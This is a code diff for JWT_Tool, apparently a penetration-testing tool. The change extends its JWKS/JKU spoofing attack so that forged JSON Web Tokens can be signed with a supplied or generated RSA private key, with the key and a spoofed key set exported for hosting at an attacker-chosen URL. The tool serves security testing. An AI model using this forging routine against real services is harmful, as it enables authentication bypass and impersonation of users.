@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 #
-# JWT_Tool version 1.3.1 (20_11_2019)
+# JWT_Tool version 1.3.2 (23_11_2019)
 # Written by ticarpi
 # Please use responsibly...
 # Software URL: https://github.com/ticarpi/jwt_tool
@@ -142,12 +142,25 @@ def signToken(headDict, paylDict, key, keyLength):
         badSig = base64.b64encode(hmac.new(key.encode(),newContents.encode(),hashlib.sha256).digest()).decode('UTF-8').strip("=")
     return newSig, badSig, newContents
 
-def jwksGen(headDict, paylDict, jku, kid="TEST"):
+def jwksGen(headDict, paylDict, jku, privateKey, kid="jwt_tool"):
     newHead = headDict
-    pubKey, privKey = newRSAKeyPair()
-    new_key = RSA.importKey(pubKey)
-    n = base64.urlsafe_b64encode(new_key.n.to_bytes(256, byteorder='big'))
-    e = base64.urlsafe_b64encode(new_key.e.to_bytes(3, byteorder='big'))
+    nowtime = str(int(datetime.datetime.now().timestamp()))
+    if privateKey:
+        key = RSA.importKey(open(privateKey).read())
+        pubKey = key.publickey().exportKey("PEM")
+        privKey = key.export_key(format="PEM")
+        new_key = RSA.importKey(pubKey)
+        n = base64.urlsafe_b64encode(new_key.n.to_bytes(256, byteorder='big'))
+        e = base64.urlsafe_b64encode(new_key.e.to_bytes(3, byteorder='big'))
+        privKeyName = privateKey
+    else:
+        pubKey, privKey = newRSAKeyPair()
+        new_key = RSA.importKey(pubKey)
+        n = base64.urlsafe_b64encode(new_key.n.to_bytes(256, byteorder='big'))
+        e = base64.urlsafe_b64encode(new_key.e.to_bytes(3, byteorder='big'))
+        privKeyName = "private_jwttool_RSA_"+nowtime+".pem"
+        with open(privKeyName, 'w') as test_priv_out:
+            test_priv_out.write(privKey.decode())
     newjwks = {}
     newjwks["kty"] = "RSA"
     newjwks["kid"] = kid
@@ -169,7 +182,10 @@ def jwksGen(headDict, paylDict, jku, kid="TEST"):
     newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
     badSig = base64.b64encode(signature).decode('UTF-8').strip("=")
     jwksout = json.dumps(newjwks,separators=(",",":"), indent=4)
-    return newSig, badSig, newContents.decode('UTF-8'), jwksout
+    jwksName = "jwks_jwttool_RSA_"+nowtime+".json"
+    with open(jwksName, 'w') as test_jwks_out:
+            test_jwks_out.write(jwksout)
+    return newSig, badSig, newContents.decode('UTF-8'), jwksout, privKeyName, jwksName
 
 def jwksEmbed(headDict, paylDict):
     newHead = headDict
@@ -179,7 +195,7 @@ def jwksEmbed(headDict, paylDict):
     e = base64.urlsafe_b64encode(new_key.e.to_bytes(3, byteorder='big'))
     jwkbuild = {}
     jwkbuild["kty"] = "RSA"
-    jwkbuild["kid"] = "TEST"
+    jwkbuild["kid"] = "jwt_tool"
     jwkbuild["use"] = "sig"
     jwkbuild["e"] = str(e.decode('UTF-8'))
     jwkbuild["n"] = str(n.decode('UTF-8').rstrip("="))
@@ -1057,18 +1073,42 @@ def tamperToken(paylDict, headDict, sig):
         print("[+] "+newContents+"."+sig)
         exit(1)
     elif selection == 7:
+        print("\nPlease select an option:")
+        print("[1] Generate new RSA key pair")
+        print("[2] Use existing RSA Private Key")
+        try:
+            selLength = int(input("> "))
+        except:
+            print("Invalid selection")
+            exit(1)
+        if selLength == 1:
+            privateKey = ""
+        elif selLength == 2:
+            print("\nPlease enter the Private Key filename:")
+            privateKey = input("> ")
+            print("\nLoading Private Key file...")
+            try:
+                keytest = open(privateKey).read()
+            except:
+                print("Could not load file")
+                exit(1)
+        else:
+            print("Invalid selection")
+            exit(1)
         print("\nPlease enter the full URL where you will host the JWKS file:")
         jku = input("> ")
         newContents = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
         try:
             kid = headDict["kid"]
-            newSig, badSig, newContents, newjwks = jwksGen(headDict, paylDict, jku, kid)
+            newSig, badSig, newContents, newjwks, privKeyName, jwksName = jwksGen(headDict, paylDict, jku, privateKey, kid)
         except:
             kid = ""
-            newSig, badSig, newContents, newjwks = jwksGen(headDict, paylDict, jku)
+            newSig, badSig, newContents, newjwks, privKeyName, jwksName = jwksGen(headDict, paylDict, jku, privateKey)
         print("\nYour new forged token:")
+        print("(Signed with: "+privKeyName+")")
         print("[+] "+newContents+"."+newSig)
         print("\nPaste this JWKS into a new file at the following location: "+jku)
+        print("(Also exported as: "+jwksName+")")
         print("[+]\n"+str(newjwks))
         exit(1)
     elif selection == 8:
@@ -1194,7 +1234,7 @@ if __name__ == '__main__':
     print("$$ |  $$ |$$$  / \$$$ |   $$ |       $$ |$$ |  $$ |$$ |  $$ |$$ |")
     print("\$$$$$$  |$$  /   \$$ |   $$ |       $$ |\$$$$$$  |\$$$$$$  |$$ |")
     print(" \______/ \__/     \__|   \__|$$$$$$\\__| \______/  \______/ \__|")
-    print("  Version 1.3                 \______|                           ")
+    print(" Version 1.3.2                \______|                           ")
     print()
 
     parser = argparse.ArgumentParser(epilog="If you don't have a token, try this one:\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po", formatter_class=argparse.RawTextHelpFormatter)
@@ -1228,6 +1268,8 @@ if __name__ == '__main__':
                         help="keyfile for cracking")
     parser.add_argument("-pk", "--pubkey", action="store",
                         help="Public Key for Asymmetric crypto")
+    parser.add_argument("-pr", "--privatekey", action="store",
+                        help="Private Key for Asymmetric crypto")
     parser.add_argument("-jw", "--jwksfile", action="store",
                         help="JSON Web Key Store for Asymmetric crypto")
     parser.add_argument("-u", "--urlinject", action="store",
@@ -1236,6 +1278,7 @@ if __name__ == '__main__':
     jwt = args.jwt
     key = ""
     pubKey = ""
+    privateKey = ""
     keyList = ""
     keyFile = ""
     jwksfile = ""
@@ -1250,6 +1293,8 @@ if __name__ == '__main__':
         key = args.password
     if args.pubkey:
         pubKey = args.pubkey
+    if args.privatekey:
+        privateKey = args.privatekey
     if args.jwksfile:
         jwksfile = args.jwksfile
     if args.urlinject:
@@ -1311,13 +1356,15 @@ if __name__ == '__main__':
             jku = urlinject
             try:
                 kid = headDict["kid"]
-                newSig, badSig, newContents, newjwks = jwksGen(headDict, paylDict, jku, kid)
+                newSig, badSig, newContents, newjwks, privKeyName, jwksName = jwksGen(headDict, paylDict, jku, privateKey, kid)
             except:
                 kid = ""
-                newSig, badSig, newContents, newjwks = jwksGen(headDict, paylDict, jku)
+                newSig, badSig, newContents, newjwks, privKeyName, jwksName = jwksGen(headDict, paylDict, jku, privateKey)
             print("\nYour new forged token:")
+            print("(Signed with: "+privKeyName+")")
             print("[+] "+newContents+"."+newSig)
             print("\nPaste this JWKS into a new file at the following location: "+jku)
+            print("(Also exported as: "+jwksName+")")
             print("[+]\n"+str(newjwks))
             exit(1)
         else:
